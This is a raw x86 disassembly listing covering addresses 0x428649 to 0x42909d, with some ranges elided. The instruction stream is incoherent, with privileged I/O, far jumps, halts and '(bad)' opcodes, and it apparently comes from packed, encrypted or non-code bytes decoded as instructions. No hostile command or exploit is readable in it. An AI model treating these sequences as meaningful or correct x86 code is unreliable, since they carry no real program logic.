  428649:	jae    0x42869f
  42864b:	stc    
  42864c:	test   al,0x3b
  42864e:	adc    DWORD PTR [eax],esp
  428650:	sub    edx,edi
  428652:	add    ebx,DWORD PTR [ecx-0x77]
  428655:	xchg   DWORD PTR [ebp-0x1ba12ac6],esp
  42865b:	mov    dl,0xe1
  42865d:	hlt    
  42865e:	or     al,0x82
  428660:	hlt    
  428661:	add    eax,0x8fd08d14
  428666:	jl     0x4285f0
  428668:	in     eax,dx
  428669:	pushf  
  42866a:	retf   
  42866b:	not    BYTE PTR [ebx+0x3c]
  42866e:	outs   dx,DWORD PTR ds:[esi]
  42866f:	jmp    0x167b:0x2a0c470c
  428676:	xchg   ebx,eax
  428677:	add    al,0xd9
  428679:	push   esp
  42867a:	add    al,0x2
  42867c:	xor    ebp,DWORD PTR [ebx]
  42867e:	pop    es
  42867f:	sbb    eax,esi
  428681:	jmp    0xca71:0x185704db
  428688:	call   0x18ee2a4c
  42868d:	in     eax,dx
  42868e:	xor    dl,BYTE PTR [ebx-0x472f874]
  428694:	cli    
  428695:	popa   
  428696:	add    BYTE PTR [esi-0x3],ch
  428699:	jmp    0xa022:0x5db0acde
  4286a0:	mov    al,0x6a
  4286a2:	clc    
  4286a3:	sti    
  4286a4:	add    ch,bh
  4286a6:	sub    BYTE PTR [edi+0x176f4182],cl
  4286ac:	push   eax
  4286ad:	dec    edi
  4286ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4286af:	daa    
  4286b0:	nop
  4286b1:	push   0x68107d
	...
  428716:	push   esi
  428717:	pop    ebx
  428718:	xor    al,0x78
  42871a:	cmp    eax,0x967f5e7f
  42871f:	or     bh,BYTE PTR ss:[ecx-0x6af59e76]
  428726:	jmp    0x1:0x70001af
  42872d:	add    BYTE PTR ds:0x4c28d15e,ch
  428733:	cvtpi2ps xmm7,QWORD PTR [edi]
  428736:	stos   BYTE PTR es:[edi],al
  428737:	push   cs
  428738:	sbb    DWORD PTR [ecx],eax
  42873a:	push   es
  42873b:	(bad)  
  42873c:	mov    DWORD PTR [ebp-0x6386cac8],0xfd0f68b1
  428746:	rcr    ebp,0x1c
  428749:	jo     0x4286fb
  42874b:	push   edx
  42874c:	clc    
  42874d:	es push edx
  42874f:	pop    ebx
  428750:	jp     0x42871d
  428752:	shr    DWORD PTR [esi-0x77],0x13
  428756:	push   eax
  428757:	pop    esi
  428758:	ins    BYTE PTR es:[edi],dx
  428759:	aaa    
  42875a:	shl    BYTE PTR [ebp-0x40],1
  42875d:	scas   eax,DWORD PTR es:[edi]
  42875e:	sub    BYTE PTR [eax-0x38732c3f],bh
  428764:	push   edx
  428765:	dec    edx
  428766:	mov    esi,0xdd19871a
  42876b:	push   esp
  42876c:	outs   dx,DWORD PTR ds:[esi]
  42876d:	mov    bl,0x14
  42876f:	aam    0xb6
  428771:	push   0x16
  428773:	retf   
  428774:	femms  
  428776:	in     al,dx
  428777:	jmp    FWORD PTR [edx]
  428779:	jmp    0x4122:0xa07d89ea
  428780:	in     al,0xb5
  428782:	mov    bl,0xb5
  428784:	icebp  
  428785:	mov    bl,0x3d
  428787:	fmul   DWORD PTR [ebx+0x1969f3d0]
  42878d:	retf   0xe9ef
  428790:	pop    ebp
  428791:	push   DWORD PTR [esi]
  428793:	jae    0x4287db
  428795:	sub    ebp,0x4e84cea5
  42879b:	fs repnz xor ch,al
  42879f:	pop    ds
  4287a0:	pop    ds
  4287a1:	scas   eax,DWORD PTR es:[edi]
  4287a2:	pop    es
  4287a3:	xor    al,0xfb
  4287a5:	loope  0x4287fd
  4287a7:	pop    ds
  4287a8:	mov    ss,ecx
  4287aa:	inc    esi
  4287ab:	shl    DWORD PTR [esi+0x57],1
  4287ae:	lahf   
  4287af:	mov    ds:0x6a7d3c2b,eax
  4287b4:	js     0x42875d
  4287b6:	inc    esi
  4287b7:	push   es
  4287b8:	test   DWORD PTR [esi+edi*8-0x48cbc2d2],edi
  4287bf:	push   edi
  4287c0:	add    BYTE PTR [ecx],cl
  4287c2:	xor    BYTE PTR [ecx+0x2c],dh
  4287c5:	pusha  
  4287c6:	lahf   
  4287c7:	inc    eax
  4287c8:	sub    al,0xc
  4287ca:	bnd jae 0x428790
  4287cd:	mov    WORD PTR [ebp+0x7d3a4e43],?
  4287d3:	mov    al,ds:0x9fecd276
  4287d8:	jae    0x4287c7
  4287da:	scas   al,BYTE PTR es:[edi]
  4287db:	sahf   
  4287dc:	shl    DWORD PTR [ebx-0x67],cl
  4287df:	fstp   QWORD PTR [edx-0x2a1b9c62]
  4287e5:	sbb    dl,cl
  4287e7:	int    0x2d
  4287e9:	jno    0x4287d3
  4287eb:	push   ebp
  4287ec:	pop    edi
  4287ed:	mov    ah,BYTE PTR [edx-0x74]
  4287f0:	test   BYTE PTR [ebx+0x2c],ch
  4287f3:	sbb    eax,0x8f22fa30
  4287f8:	jecxz  0x428866
  4287fa:	mov    ah,0x7b
  4287fc:	pop    edx
  4287fd:	jmp    0x825:0xb1cc94b2
  428804:	shr    DWORD PTR [edx+0x5ce22358],cl
  42880a:	mov    eax,0xa035775e
  42880f:	sub    al,0x7a
  428811:	fmul   DWORD PTR [ecx]
  428813:	or     bh,ch
  428815:	ror    cl,cl
  428817:	je     0x4287e2
  428819:	pop    esp
  42881a:	adc    DWORD PTR [edi-0x1a],edx
  42881d:	mov    ah,0x39
  42881f:	mov    al,ds:0x380f16b7
  428824:	inc    edx
  428825:	and    BYTE PTR [edx],bh
  428827:	add    edx,DWORD PTR [ecx-0x38]
  42882a:	add    DWORD PTR [eax+ecx*2],0x17
  42882e:	jnp    0x428812
  428830:	mov    ah,0x28
  428832:	add    edx,DWORD PTR [edi-0x3f]
	...
  428895:	add    BYTE PTR [esi],ah
  428897:	jp     0x42890a
  428899:	les    edi,FWORD PTR [ebp-0x31]
  42889c:	mov    bh,0xfa
  42889e:	ret    
  42889f:	ja     0x428848
  4288a1:	test   DWORD PTR [edx],ecx
  4288a3:	push   esi
  4288a4:	out    0xc9,al
  4288a6:	icebp  
  4288a7:	mov    al,0x1
  4288a9:	add    BYTE PTR [edi],al
  4288ab:	add    DWORD PTR [eax],eax
  4288ad:	add    BYTE PTR [ecx+0x66],cl
  4288b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4288b1:	call   DWORD PTR [ebp-0xbb1a79f]
  4288b7:	xchg   esi,eax
  4288b8:	inc    esp
  4288b9:	in     eax,dx
  4288ba:	aam    0x2d
  4288bc:	xlat   BYTE PTR ds:[ebx]
  4288bd:	lds    ecx,FWORD PTR [ecx+0x40623f79]
  4288c3:	leave  
  4288c4:	jp     0x428917
  4288c6:	sqrtps xmm4,XMMWORD PTR [esi+edi*4+0x756cf406]
  4288ce:	xor    eax,0xf7922216
  4288d3:	dec    ecx
  4288d4:	pop    eax
  4288d5:	frstor [ebx+0x176f756e]
  4288db:	and    BYTE PTR [eax+0x18],cl
  4288de:	push   ebx
  4288df:	inc    edi
  4288e0:	and    eax,0x2b22992d
  4288e5:	rcr    BYTE PTR [edi-0x53],0x49
  4288e9:	pop    ebp
  4288ea:	xor    DWORD PTR [ecx-0x408a336e],ebx
  4288f0:	aaa    
  4288f1:	inc    ebp
  4288f2:	mov    ds:0x75fff296,al
  4288f7:	mov    esi,ebp
  4288f9:	push   ds
  4288fa:	jns    0x428910
  4288fc:	mov    esi,0xf6140d07
  428901:	adc    bh,BYTE PTR [edi+0x583ae8fe]
  428907:	daa    
  428908:	lods   al,BYTE PTR ds:[esi]
  428909:	jno    0x4288dc
  42890b:	int    0x63
  42890d:	push   edx
  42890e:	xor    DWORD PTR [ebp-0x4f8f001],ecx
  428914:	xchg   ebx,eax
  428915:	sbb    DWORD PTR [edi-0x5b898601],ebp
  42891b:	adc    esp,DWORD PTR [esi]
  42891d:	ja     0x42898c
  42891f:	sar    BYTE PTR [esi+0x31],0x12
  428923:	daa    
  428924:	popa   
  428925:	leave  
  428926:	mov    ebx,0x51704bb7
  42892b:	or     al,0x97
  42892d:	out    0xc8,eax
  42892f:	add    bl,BYTE PTR [edi+0x1b]
  428932:	data16 hlt 
  428934:	adc    DWORD PTR [ebx+0x4e],ebx
  428937:	lea    ebx,[ecx+0x40]
  42893a:	and    DWORD PTR ds:0x5c5e98d2,edi
  428940:	and    al,0x56
  428942:	inc    edi
  428943:	mov    cl,0xcd
  428945:	inc    edx
  428946:	pop    esp
  428947:	fs (bad) 
  428949:	aam    0x16
  42894b:	(bad)  
  42894c:	and    ah,cl
  42894e:	add    al,0x59
  428950:	data16 sub BYTE PTR cs:[eax-0x4b6dd61d],0xb1
  428959:	imul   ebx,DWORD PTR [edx+0x5],0x79
  42895d:	clc    
  42895e:	call   0xd8cd17e2
  428963:	cmp    eax,0xd697dc7
  428968:	dec    esi
  428969:	mov    ebx,0xae0ac384
  42896e:	push   esi
  42896f:	jmp    0x944d:0x8d9ef720
  428976:	mov    bh,0xab
  428978:	cmp    cl,BYTE PTR [ecx+edx*1+0x7ba977e3]
  42897f:	in     al,dx
  428980:	adc    edi,DWORD PTR [ebp+0x4d]
  428983:	mov    ss,WORD PTR ds:0xd11ee356
  428989:	in     al,dx
  42898a:	pop    ds
  42898b:	fcomp  QWORD PTR [ebp-0x6a]
  42898e:	shr    DWORD PTR [ebp+0x4],0x50
  428992:	and    al,BYTE PTR [edx]
  428994:	stc    
  428995:	jns    0x428a02
  428997:	repz inc esi
  428999:	xor    BYTE PTR [ebx+eax*2-0x72],bh
  42899d:	or     ebx,esp
  42899f:	pusha  
  4289a0:	xchg   ebp,eax
  4289a1:	pop    ecx
  4289a2:	pop    edi
  4289a3:	dec    edx
  4289a4:	pop    es
  4289a5:	in     al,0xc9
  4289a7:	imul   ebp,DWORD PTR [ecx+0x76],0x81dc90b7
  4289ae:	cmp    dl,BYTE PTR [edx]
  4289b0:	mov    ecx,0xf6893da4
	...
  428a15:	add    BYTE PTR [ebp+0xc],cl
  428a18:	clc    
  428a19:	pop    ebx
  428a1a:	stc    
  428a1b:	(bad)  
  428a1c:	out    dx,eax
  428a1d:	push   ds
  428a1e:	push   ss
  428a1f:	xchg   edx,eax
  428a20:	data16 aas 
  428a22:	popa   
  428a23:	dec    ebp
  428a24:	push   ebx
  428a25:	or     al,0xf8
  428a27:	mov    cl,0x1
  428a29:	add    BYTE PTR [edi],al
  428a2b:	add    DWORD PTR [eax],eax
  428a2d:	add    ah,dl
  428a2f:	or     al,0x8
  428a31:	stos   BYTE PTR es:[edi],al
  428a32:	into   
  428a33:	iret   
  428a34:	inc    edx
  428a35:	sti    
  428a36:	inc    ebp
  428a37:	pop    ecx
  428a38:	xchg   BYTE PTR [ecx+0xf54acce],ch
  428a3e:	mov    dh,al
  428a40:	lods   al,BYTE PTR ds:[esi]
  428a41:	xchg   edi,eax
  428a42:	dec    ebx
  428a43:	aam    0xc7
  428a45:	jo     0x428a3c
  428a47:	mov    ebp,0x463a1def
  428a4c:	xor    eax,0xba1c71e1
  428a51:	lahf   
  428a52:	test   DWORD PTR [esi],ebx
  428a54:	cs dec esp
  428a56:	pop    ebx
  428a57:	sti    
  428a58:	mov    al,0xf6
  428a5a:	xchg   ebx,eax
  428a5b:	(bad)  
  428a5c:	(bad)  [esi+0x7b]
  428a5f:	outs   dx,DWORD PTR ds:[esi]
  428a60:	dec    edx
  428a61:	std    
  428a62:	push   es
  428a63:	dec    esi
  428a64:	ficomp WORD PTR [eax+edx*8+0x3a3f1514]
  428a6b:	ds mov ebp,ecx
  428a6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428a6f:	das    
  428a70:	push   esp
  428a71:	mov    ch,0xd1
  428a73:	push   ebp
  428a74:	push   ss
  428a75:	sar    BYTE PTR [eax+0x3d2ab30b],1
  428a7b:	shl    BYTE PTR [ecx+ebx*2+0x65bf7e3e],0x36
  428a83:	jbe    0x428a6d
  428a85:	push   eax
  428a86:	jbe    0x428afb
  428a88:	inc    edx
  428a89:	fst    DWORD PTR [ecx]
  428a8b:	pop    ecx
  428a8c:	inc    esi
  428a8d:	in     al,dx
  428a8e:	out    0xa2,eax
  428a90:	dec    ebp
  428a91:	mov    dh,0x85
  428a93:	fidivr WORD PTR [edi]
  428a95:	lea    edi,[ebp-0xf407b5e]
  428a9b:	mov    BYTE PTR [edx],ah
  428a9d:	daa    
  428a9e:	cdq    
  428a9f:	repnz push 0x3a7c4c7e
  428aa5:	stc    
  428aa6:	(bad)  
  428aa8:	push   es
  428aa9:	and    eax,0x71d7c000
  428aae:	cmovp  edx,DWORD PTR [ecx+0x7e7cc1ea]
  428ab5:	dec    eax
  428ab6:	outs   dx,DWORD PTR ds:[esi]
  428ab7:	ja     0x428aef
  428ab9:	pushf  
  428aba:	mov    cl,0xf6
  428abc:	(bad)  
  428abd:	mov    ecx,0xa4a19b3d
  428ac2:	bound  esp,QWORD PTR [ebp-0x18]
  428ac5:	xor    eax,0x26a33205
  428aca:	mov    ecx,edi
  428acc:	test   eax,0x6634aefd
  428ad1:	adc    eax,0x1d5610b6
  428ad6:	test   esi,0xcc82c05f
  428adc:	xlat   BYTE PTR ds:[ebx]
  428add:	cli    
  428ade:	xchg   ebp,eax
  428adf:	add    cl,BYTE PTR [ecx]
  428ae1:	jle    0x428a7a
  428ae3:	fcom   QWORD PTR [ecx]
  428ae5:	pop    esi
  428ae6:	fisttp QWORD PTR [ebp-0x7d]
  428ae9:	ja     0x428b03
  428aeb:	out    0x92,al
  428aed:	adc    edi,eax
  428aef:	je     0x428afb
  428af1:	int3   
  428af2:	xchg   edi,eax
  428af3:	ds jbe 0x428ad6
  428af6:	inc    ebx
  428af7:	mov    esp,0x748b19f
  428afc:	scas   eax,DWORD PTR es:[edi]
  428afd:	push   ecx
  428afe:	rcr    DWORD PTR [ecx],1
  428b00:	inc    ecx
  428b01:	adc    DWORD PTR [ebx+0x55a3a09f],ebx
  428b07:	and    BYTE PTR [eax-0x72],bh
  428b0a:	and    DWORD PTR [edx-0x64],edx
  428b0d:	push   esi
  428b0e:	repnz dec edi
  428b10:	mov    edx,0xc99c1eb5
  428b15:	lock jg 0x428aa2
  428b18:	xchg   ebp,eax
  428b19:	xor    cl,BYTE PTR [edi]
  428b1b:	pop    edi
  428b1c:	xchg   esp,eax
  428b1d:	sub    al,0x8d
  428b1f:	(bad)  
  428b22:	jae    0x428aa9
  428b24:	cdq    
  428b25:	test   ecx,ecx
  428b27:	es mov esi,0x1b4a9f89
  428b2d:	xlat   BYTE PTR ds:[ebx]
  428b2e:	std    
  428b2f:	stos   BYTE PTR es:[edi],al
  428b30:	lahf   
  428b31:	mov    al,ds:0x92011e
	...
  428b96:	lds    edx,FWORD PTR [ebp-0x76]
  428b99:	cli    
  428b9a:	call   0x5fb1:0xb77ff5ff
  428ba1:	test   eax,0xfef6a1cb
  428ba6:	push   DWORD PTR [edx+0x1070001]
  428bac:	add    BYTE PTR [eax],al
  428bae:	imul   esi,DWORD PTR [ebx+eax*4-0x3eef6324],0x42
  428bb6:	std    
  428bb7:	xchg   edi,eax
  428bb8:	sub    esi,DWORD PTR [esi+0x1e4eb01b]
  428bbe:	xor    eax,0x28dcaf32
  428bc3:	cld    
  428bc4:	stos   BYTE PTR es:[edi],al
  428bc5:	xor    BYTE PTR [edx-0x1b],bh
  428bc8:	unpckhps xmm7,XMMWORD PTR [esi]
  428bcb:	dec    esp
  428bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428bcd:	iret   
  428bce:	add    DWORD PTR [edi-0x6c],eax
  428bd1:	mov    esi,0x5a010e5d
  428bd6:	inc    esp
  428bd7:	ins    BYTE PTR es:[edi],dx
  428bd8:	pop    esi
  428bd9:	xchg   cl,bl
  428bdb:	xchg   esp,eax
  428bdc:	xchg   ebx,eax
  428bdd:	inc    esi
  428bde:	dec    ebp
  428bdf:	loop   0x428c2b
  428be1:	loopne 0x428ba7
  428be3:	adc    DWORD PTR [edi],ecx
  428be5:	repnz test al,0xb0
  428be8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428be9:	dec    edx
  428bea:	int3   
  428beb:	ds pushf 
  428bed:	out    0xff,eax
  428bef:	inc    esi
  428bf0:	mov    ebx,DWORD PTR [ecx+0x7479fd01]
  428bf6:	sub    BYTE PTR [ebp-0x39],ah
  428bf9:	ss xchg edi,eax
  428bfb:	jg     0x428c2a
  428bfd:	ins    DWORD PTR es:[edi],dx
  428bfe:	mov    bh,0xe9
  428c00:	and    eax,0xbd3b1657
  428c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c06:	cwde   
  428c07:	inc    ecx
  428c08:	push   edx
  428c09:	sbb    BYTE PTR [ebx-0x23dfd0f],bh
  428c0f:	daa    
  428c10:	or     bh,al
  428c12:	ret    0xcb0b
  428c15:	in     eax,dx
  428c16:	mov    ecx,0xcaf01ac7
  428c1b:	mov    dh,0xe3
  428c1d:	adc    dh,bh
  428c1f:	sar    BYTE PTR [eax-0x2c],0xe1
  428c23:	jne    0x428c91
  428c25:	retf   
  428c26:	test   al,0xc5
  428c28:	push   edi
  428c29:	stos   BYTE PTR es:[edi],al
  428c2a:	idiv   ecx
  428c2c:	test   al,0x4d
  428c2e:	or     DWORD PTR [edx+0x3b],esp
  428c31:	daa    
  428c32:	sbb    BYTE PTR [ecx],0x5b
  428c35:	cmp    ah,dh
  428c37:	sub    eax,0x99e58917
  428c3c:	push   edi
  428c3d:	(bad)  
  428c3f:	cmp    DWORD PTR [edi-0x4a2daf50],esi
  428c45:	pop    ds
  428c46:	les    edx,FWORD PTR [edi]
  428c48:	dec    edi
  428c49:	xor    BYTE PTR [edx-0x77d5d040],0x5c
  428c50:	dec    ecx
  428c51:	mov    al,ds:0xf9bc9a99
  428c56:	pusha  
  428c57:	in     eax,dx
  428c58:	(bad)  
  428c59:	and    DWORD PTR [ecx+0x18],ebx
  428c5c:	aaa    
  428c5d:	push   es
  428c5e:	out    0xff,al
  428c60:	or     al,BYTE PTR [ebx]
  428c62:	mov    ch,0x2c
  428c64:	(bad)  
  428c65:	jp     0x428c49
  428c67:	push   esp
  428c68:	mov    al,ds:0x8840e21f
  428c6d:	dec    eax
  428c6e:	mov    ah,0xc5
  428c70:	or     al,0x2e
  428c72:	ss dec esp
  428c74:	jge    0x428c80
  428c76:	fistp  DWORD PTR [edi+0x78]
  428c79:	rcr    DWORD PTR ss:[ebp+0x42],0xcd
  428c7e:	hlt    
  428c7f:	inc    ecx
  428c80:	dec    eax
  428c81:	jg     0x428c30
  428c83:	dec    esi
  428c84:	xlat   BYTE PTR ds:[ebx]
  428c85:	or     al,0xb2
  428c87:	stc    
  428c88:	sub    eax,0xdd7e84f
  428c8d:	aam    0x39
  428c8f:	inc    edi
  428c90:	(bad)  
  428c91:	in     eax,dx
  428c92:	mov    ebp,0xa0328a32
  428c97:	inc    ebp
  428c98:	xor    eax,0xff68ed3f
  428c9d:	and    esp,DWORD PTR [ebp+0x63]
  428ca0:	cmp    al,0xb9
  428ca2:	jmp    0x428d1a
  428ca4:	in     eax,0xc8
  428ca6:	adc    esi,ecx
  428ca8:	add    DWORD PTR [ebp-0x22817a3c],ebp
  428cae:	push   es
  428caf:	sub    al,0x2c
  428cb1:	add    eax,0xdf3849
	...
  428d16:	xor    DWORD PTR [ebp+0x75f531f1],0x9686b5c1
  428d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d21:	jns    0x428d20
  428d23:	mov    BYTE PTR [ebx+0x29],bh
  428d26:	push   es
  428d27:	mov    ah,0x1
  428d29:	add    BYTE PTR [edi],al
  428d2b:	add    DWORD PTR [eax],eax
  428d2d:	add    dh,ch
  428d2f:	xlat   BYTE PTR ds:[ebx]
  428d30:	popf   
  428d31:	int3   
  428d32:	mov    cl,0xd8
  428d34:	push   eax
  428d35:	ret    
  428d36:	fidiv  WORD PTR [ebx+0x58cb9726]
  428d3c:	add    DWORD PTR [ecx-0x4],ebx
  428d3f:	inc    esp
  428d40:	cs cmp al,0x78
  428d43:	lahf   
  428d44:	outs   dx,DWORD PTR ds:[esi]
  428d45:	xchg   edi,eax
  428d46:	hlt    
  428d47:	dec    esp
  428d48:	xchg   esp,eax
  428d49:	mov    DWORD PTR [edi+0x50],esp
  428d4c:	imul   esp,ebp,0x2a611b2a
  428d52:	nop
  428d53:	push   ebx
  428d54:	dec    esi
  428d55:	add    DWORD PTR [ebx+0x4a],0x1d
  428d59:	mov    bl,0x59
  428d5b:	rcr    BYTE PTR [eax+0x3d9c9a69],cl
  428d61:	push   esp
  428d62:	ds pop es
  428d64:	fmul   st,st(0)
  428d66:	fnstenv [ecx-0x3e0a3a51]
  428d6c:	imul   esi,DWORD PTR [esi+0x26c6d592],0x6956bbe1
  428d76:	in     al,dx
  428d77:	aad    0x30
  428d79:	fistp  QWORD PTR ds:0x27355859
  428d7f:	cmc    
  428d80:	dec    edx
  428d81:	(bad)  
  428d83:	sub    eax,0x6cb34ba1
  428d88:	sub    edi,0x53a393b9
  428d8e:	call   0x244123b8
  428d93:	mov    ds:0xf66661a8,eax
  428d98:	sbb    ecx,edi
  428d9a:	(bad)  
  428d9b:	test   ch,bl
  428d9d:	mov    WORD PTR [edi],fs
  428d9f:	ror    BYTE PTR [esi+0x5],0x7d
  428da3:	pop    ds
  428da4:	jl     0x428d35
  428da6:	sbb    esi,edi
  428da8:	ins    DWORD PTR es:[edi],dx
  428da9:	inc    ebx
  428daa:	cmp    DWORD PTR [edx-0x25171d43],0xe19109e8
  428db4:	mov    edi,esp
  428db6:	mov    edi,0x2b911008
  428dbb:	pushf  
  428dbc:	shr    BYTE PTR [ecx-0x56ac9417],0x4e
  428dc3:	enter  0x431e,0x8e
  428dc7:	dec    esp
  428dc8:	sti    
  428dc9:	mov    eax,ds:0x64084fef
  428dce:	xchg   ebx,eax
  428dcf:	or     al,0x17
  428dd1:	pusha  
  428dd2:	pop    ds
  428dd3:	lahf   
  428dd4:	stos   DWORD PTR es:[edi],eax
  428dd5:	(bad)  
  428dd6:	cld    
  428dd7:	aas    
  428dd8:	inc    edi
  428dd9:	retf   0xe069
  428ddc:	push   ebx
  428ddd:	call   FWORD PTR [edi+0x3ccdb6a9]
  428de3:	ror    BYTE PTR [edx-0x2284a5d5],0x67
  428dea:	xlat   BYTE PTR ds:[ebx]
  428deb:	fild   QWORD PTR [ecx]
  428ded:	es (bad) 
  428def:	jns    0x428de1
  428df1:	pop    esp
  428df2:	les    ebx,FWORD PTR [ecx-0x430d29e2]
  428df8:	xchg   esp,eax
  428df9:	mov    al,ds:0x5961c80
  428dfe:	jmp    0xe03c:0x82564
  428e05:	mov    esp,0x53b02c78
  428e0a:	mov    cl,0xc4
  428e0c:	shr    DWORD PTR [eax+0x43],0xcc
  428e10:	sub    BYTE PTR [edx],ah
  428e12:	xchg   esp,eax
  428e13:	pop    ecx
  428e14:	sbb    DWORD PTR [ebp-0x13],ecx
  428e17:	loopne 0x428dd6
  428e19:	stc    
  428e1a:	in     eax,dx
  428e1b:	mov    cl,0x3e
  428e1d:	addr16 add eax,0x150385cc
  428e23:	adc    BYTE PTR [eax-0x24ae4c28],0xb4
  428e2a:	into   
  428e2b:	mov    ecx,0x56fb8e99
  428e30:	xchg   esi,eax
  428e31:	lds    ebx,FWORD PTR [ebp-0x54]
  428e34:	retf   
	...
  428e95:	add    BYTE PTR [edi+0x5d],cl
  428e98:	pop    ecx
  428e99:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428e9d:	(bad)  
  428e9f:	cli    
  428ea0:	test   al,0xd9
  428ea2:	popf   
  428ea3:	mov    dh,0x4b
  428ea5:	scas   al,BYTE PTR es:[edi]
  428ea6:	or     eax,0x70001b5
  428eab:	add    DWORD PTR [eax],eax
  428ead:	add    BYTE PTR [ebp-0x3c700186],al
  428eb3:	lea    eax,[ebx+0x15276235]
  428eb9:	inc    ebx
  428eba:	aaa    
  428ebb:	es jp  0x428efa
  428ebe:	std    
  428ebf:	out    0x6f,al
  428ec1:	mov    edx,0x38f24b7f
  428ec6:	loopne 0x428ea3
  428ec8:	pop    ebp
  428ec9:	leave  
  428eca:	dec    eax
  428ecb:	and    eax,0xb438c287
  428ed0:	iret   
  428ed1:	sbb    DWORD PTR [ebx],esi
  428ed3:	out    dx,eax
  428ed4:	inc    edi
  428ed5:	fucomi st,st(5)
  428ed7:	adc    eax,0x85c2ea06
  428edc:	push   esi
  428edd:	out    0x80,eax
  428edf:	push   esi
  428ee0:	push   0xffffff91
  428ee2:	xchg   edi,eax
  428ee3:	xor    al,0xde
  428ee5:	sar    ebp,1
  428ee7:	outs   dx,DWORD PTR ds:[esi]
  428ee8:	ror    BYTE PTR [ebx+ebp*1+0x75],cl
  428eec:	sahf   
  428eed:	mov    edi,0x3e6e4aa9
  428ef2:	pop    esi
  428ef3:	fild   DWORD PTR [bp+si-0x17]
  428ef7:	mov    ebx,DWORD PTR [ebx]
  428ef9:	mov    esi,0x37c818a4
  428efe:	mov    eax,ds:0x98a88cf0
  428f03:	sbb    BYTE PTR gs:[esi],dh
  428f06:	std    
  428f07:	test   eax,0x3aa75e40
  428f0c:	mov    esi,0xb8dfa24f
  428f11:	xlat   BYTE PTR ds:[ebx]
  428f12:	mov    esp,0xbf5c22df
  428f17:	add    al,0xb9
  428f19:	and    dh,BYTE PTR [eax]
  428f1b:	ins    DWORD PTR es:[edi],dx
  428f1c:	sub    DWORD PTR ds:0xdc18e7ca,edx
  428f22:	mov    ebp,0xd34ffe2a
  428f27:	push   0x4e
  428f29:	pushf  
  428f2a:	push   esp
  428f2b:	push   0xfffffff3
  428f2d:	add    eax,0xd9ab4d9d
  428f32:	ins    BYTE PTR es:[edi],dx
  428f33:	add    edx,0x59
  428f36:	mov    ds:0x65bf812f,al
  428f3b:	add    eax,ecx
  428f3d:	scas   eax,DWORD PTR es:[edi]
  428f3e:	cli    
  428f3f:	pop    ecx
  428f40:	and    ch,al
  428f42:	sub    eax,0xfea8b8b0
  428f47:	lods   al,BYTE PTR ds:[esi]
  428f48:	xchg   ebp,eax
  428f49:	xchg   edx,eax
  428f4b:	aam    0xee
  428f4d:	and    al,0x21
  428f4f:	jmp    0x428f04
  428f51:	jecxz  0x428f51
  428f53:	test   al,0xb6
  428f55:	mov    ebx,0x30273fce
  428f5a:	aas    
  428f5b:	aaa    
  428f5c:	lods   al,BYTE PTR ds:[esi]
  428f5d:	lock mov WORD PTR [edi-0x2],?
  428f61:	mov    edx,0xb5380a3f
  428f66:	rcr    BYTE PTR [edx+0x23151a83],cl
  428f6c:	jmp    0x617e:0x687e254b
  428f73:	cdq    
  428f74:	repz call 0xb32f:0x3667b82a
  428f7c:	xchg   ebp,eax
  428f7d:	mov    al,ds:0x3a289a75
  428f82:	sbb    eax,DWORD PTR [ebx-0x75]
  428f85:	and    eax,0xb75ffb0e
  428f8a:	jmp    0x153ee3cf
  428f8f:	xor    BYTE PTR [esi+0x5b1131d],dh
  428f95:	call   0x26744921
  428f9a:	xor    BYTE PTR [esi+0x792cc518],ah
  428fa0:	xchg   ebp,eax
  428fa1:	pushf  
  428fa2:	fs dec eax
  428fa4:	push   edx
  428fa5:	xchg   esi,eax
  428fa6:	pop    ebp
  428fa8:	in     al,dx
  428fa9:	jno    0x42900b
  428fab:	ds pop ss
  428fad:	sbb    BYTE PTR ds:0x176a1551,ah
  428fb3:	ins    DWORD PTR es:[edi],dx
  428fb4:	aaa    
	...
  429015:	add    cl,ah
  429017:	in     al,dx
  429018:	mov    ebx,es
  42901a:	(bad)  
  42901b:	jecxz  0x42900c
  42901d:	out    dx,al
  42901e:	arpl   WORD PTR [esi+0x79],cx
  429021:	sbb    DWORD PTR [eax+eiz*2],ecx
  429024:	jp     0x42908b
  429026:	adc    al,0xb6
  429028:	add    DWORD PTR [eax],eax
  42902a:	pop    es
  42902b:	add    DWORD PTR [eax],eax
  42902d:	add    BYTE PTR [esi-0x7f],dh
  429030:	fucomi st,st(1)
  429032:	and    edi,ebp
  429034:	dec    edx
  429035:	scas   al,BYTE PTR es:[edi]
  429036:	imul   ebx,DWORD PTR [ebx],0x45
  429039:	push   esi
  42903a:	fwait
  42903b:	adc    BYTE PTR [ebx+0x1f],0xef
  42903f:	aas    
  429040:	in     eax,0xde
  429042:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429043:	out    0x1d,al
  429045:	pusha  
  429046:	sti    
  429047:	clc    
  429048:	and    al,0xd0
  42904a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42904b:	mov    ds,WORD PTR [ebp+0x79]
  42904e:	or     eax,0xc8034af9
  429053:	push   ebx
  429054:	addr16 aaa 
  429056:	xor    ah,BYTE PTR ss:[esi]
  429059:	push   esp
  42905a:	fdivr  st(4),st
  42905c:	jle    0x4290c1
  42905e:	je     0x5655fb5a
  429064:	xchg   ebp,eax
  429065:	dec    edi
  429066:	arpl   WORD PTR [esi],bx
  429068:	push   eax
  429069:	mov    ecx,0xef3bde67
  42906e:	xor    BYTE PTR [ecx],ch
  429070:	hlt    
  429071:	daa    
  429072:	pop    ecx
  429073:	push   ecx
  429074:	add    BYTE PTR [edx-0x4c],0x86
  429078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429079:	retf   
  42907a:	out    dx,eax
  42907b:	imul   esi,DWORD PTR [ebx-0x36],0x17f26567
  429082:	adc    BYTE PTR [edi+0x5b],ch
  429085:	sbb    al,0xd6
  429087:	repnz test al,0x66
  42908a:	mov    cl,0xa4
  42908c:	imul   eax,DWORD PTR [edi-0x462b4836],0xe87e6ef
  429096:	xchg   esp,eax
  429097:	and    ah,BYTE PTR [edi-0x4d]
  42909a:	pop    edx
  42909b:	pop    ebp
  42909c:	into   
  42909d:	pop    edx
